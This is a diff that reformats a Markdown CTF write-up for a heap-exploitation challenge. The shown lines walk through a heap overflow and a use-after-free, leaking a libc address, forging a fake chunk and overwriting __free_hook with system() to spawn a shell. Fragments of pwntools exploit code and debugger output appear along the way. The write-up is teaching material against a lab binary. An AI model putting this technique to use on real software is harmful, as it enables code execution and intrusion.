@@ -14,18 +14,17 @@ Version: Ubuntu 20.04
 
 ## Background
 * hook - [SS111-Pwn2](https://youtu.be/MwjSNFQIx0c?t=838)
-![](https://imgur.com/lx8zR2J.png)
-[Hook簡介](https://blog.xuite.net/peterlee.tw/twblog/112094832)
-[Hook Function (攔截函式)](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjIxp70jeL8AhUjQPUHHde8BDcQFnoECA4QAQ&url=https%3A%2F%2Fxtutlab.blogspot.com%2F2018%2F10%2Fhook-function.html&usg=AOvVaw26FwxmT40uQgIsFIlbjs2k)
+    ![](https://imgur.com/lx8zR2J.png)
+* [Hook簡介](https://blog.xuite.net/peterlee.tw/twblog/112094832)
+* [Hook Function (攔截函式)](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjIxp70jeL8AhUjQPUHHde8BDcQFnoECA4QAQ&url=https%3A%2F%2Fxtutlab.blogspot.com%2F2018%2F10%2Fhook-function.html&usg=AOvVaw26FwxmT40uQgIsFIlbjs2k)
 * The process of free and priority
-Assume we malloc a memory with size over <font color="FF0000">`0x410`</font>, then when we free it, it'll be classified to <font color="FF0000">`Unsorted bin`</font> instead of `tcache`
-![](https://imgur.com/kCTN7cs.png)
-![](https://imgur.com/u2Wy9xw.png)
+    Assume we malloc a memory with size over <font color="FF0000">`0x410`</font>, then when we free it, it'll be classified to <font color="FF0000">`Unsorted bin`</font> instead of `tcache`
+    ![](https://imgur.com/kCTN7cs.png)
+    ![](https://imgur.com/u2Wy9xw.png)
 
 
 ## Original Code
-:::spoiler code
-```cpp=
+```cpp
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
@@ -139,7 +138,6 @@ int main()
     return 0;
 }
 ```
-:::
 
 ### Description
 The data structure is as below, we can use `add_note` to create a new note and use `edit_note` to add/modify the data of note. Or just delete specific note or use `show_note` to print all of them.
@@ -147,8 +145,9 @@ The data structure is as below, we can use `add_note` to create a new note and u
 
 ### Something Wrong
 * edit_note has heap overflow
-So that we can add 2 notes and use edit function to overlap the 2nd notes.
-    ```python=
+    
+    So that we can add 2 notes and use edit function to overlap the 2nd notes.
+    ```python
     add_note(0, b'a'*8)
     edit_note(0, 0xa, b'a')
 
@@ -157,13 +156,14 @@ So that we can add 2 notes and use edit function to overlap the 2nd notes.
     ```
 
     * Before overlap
-    ![](https://imgur.com/2BZOqMu.png)
+        ![](https://imgur.com/2BZOqMu.png)
 
     * After overlap
-    ![](https://imgur.com/zVCt3bR.png)
+        ![](https://imgur.com/zVCt3bR.png)
 * used after free(UAF)
-It has not deleted the pointer when it was freed
-    ```cpp!
+    
+    It has not deleted the pointer when it was freed
+    ```cpp
     void del_note()
     {
         short int idx;
@@ -180,7 +180,7 @@ Based on the problem we found above, we can try to use `__free_hook` to execute 
 
 ## Exploit - UAF + heap overflow + __free_hook
 1. Try to construct heap structure that we need
-    ```python!
+    ```python
     add_note(0, b'a'*8)    # index 0
     edit_note(0, 0x418, b'a')
 
@@ -194,11 +194,11 @@ Based on the problem we found above, we can try to use `__free_hook` to execute 
     * `index 2` is a fake chunk that we have to construct
 
 2. Leak `libc` address and find `__free_hook`, `__libc_system`
-* The reason that we set the data size of `index 0` be `0x418`(1048 in decimal) is because when we free it, it will be classified to `Unsorted bin` and the `fd` and `bk` will store the address of `libc`
-![](https://imgur.com/6vhQrxv.png)
-![](https://imgur.com/pTCDtZo.png)
-Then we have to find where is `__libc_system` and `__free_hook`
-    ```bash!
+    * The reason that we set the data size of `index 0` be `0x418`(1048 in decimal) is because when we free it, it will be classified to `Unsorted bin` and the `fd` and `bk` will store the address of `libc`
+    ![](https://imgur.com/6vhQrxv.png)
+    ![](https://imgur.com/pTCDtZo.png)
+    Then we have to find where is `__libc_system` and `__free_hook`
+    ```bash
     pwndbg> p __libc_system
     $1 = {int (const char *)} 0x7f9614bac290 <__libc_system>
     pwndbg> p &__free_hook
@@ -210,7 +210,7 @@ Then we have to find where is `__libc_system` and `__free_hook`
     `__free_hook`: $0x7f9614d48e48 - 0x7f9614b5a000 = 0x1eee48$
     
     So, we delete `index 0` first, and try to use `show_note` function to receive the `Unsorted bin fd`
-    ```python!
+    ```python
     delete_note(0)
     show_note()
     r.recvuntil(b'data:')
@@ -222,7 +222,7 @@ Then we have to find where is `__libc_system` and `__free_hook`
     info(f"__libc_system address: {hex(libc_sys_addr)}")
     ```
 3. Construct fake chunk by using heap overflow
-    ```python!
+    ```python
     data = b'/bin/sh\x00'.ljust(0x10, b'b')
     fake_chunk = flat(
         0, 0x21,
@@ -238,17 +238,17 @@ Then we have to find where is `__libc_system` and `__free_hook`
     ![](https://imgur.com/ycuFgwR.png)
     
 4. Delete `index 1` and call `__free_hook`
-When we free `index 1` and `__free_hook` is not NULL, then `__free_hook` can be a function pointer to execute `0x7ffbb6500290` that is `__libc_system` and the parameter is `index 1` data, that is `/bin/sh\x00`
-    ```python!
+    
+    When we free `index 1` and `__free_hook` is not NULL, then `__free_hook` can be a function pointer to execute `0x7ffbb6500290` that is `__libc_system` and the parameter is `index 1` data, that is `/bin/sh\x00`
+    ```python
     delete_note(1)
     ```
 
 5. Well, we got shell!!
-![](https://imgur.com/PJGAAba.png)
+    ![](https://imgur.com/PJGAAba.png)
 
 * Whole exploit
-    :::spoiler code
-    ```python=
+    ```python
     from pwn import *
 
     # r = process('./chal')
@@ -314,7 +314,6 @@ When we free `index 1` and `__free_hook` is not NULL, then `__free_hook` can be 
 
     r.interactive()
     ```
-    :::
 
 ## Reference
 [SS111-Pwn2](https://youtu.be/MwjSNFQIx0c)
